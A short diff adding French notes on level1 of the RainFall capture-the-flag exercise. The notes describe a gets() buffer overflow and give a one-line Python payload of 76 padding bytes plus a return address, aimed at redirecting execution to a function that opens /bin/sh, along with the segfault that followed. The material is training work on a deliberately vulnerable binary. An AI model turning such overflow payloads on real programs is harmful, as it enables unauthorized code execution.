@@ -1,0 +1,18 @@
+gdb level1
+run
+jump run
+on arrive dans un shell mais on est le user level1
+
+on remarque la fonction gets dans laquelle on peut faire une injection de buffer overflow 
+
+si on injecte une valeur plus grande que ce qui a ete assigné on peut faire une injection
+
+le but est de pointer vers l'adresse de run 
+
+j'arrive a avoir la bonne phrase mais ensuite le script segfault 
+
+level1@RainFall:~$ echo $(python -c 'print "\x41" * 76 + "\x44\x84\x04\x08"') | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+dans une boucle infinie on voit que le script ouvre /bin/sh mais cherche a executer les 76 A 
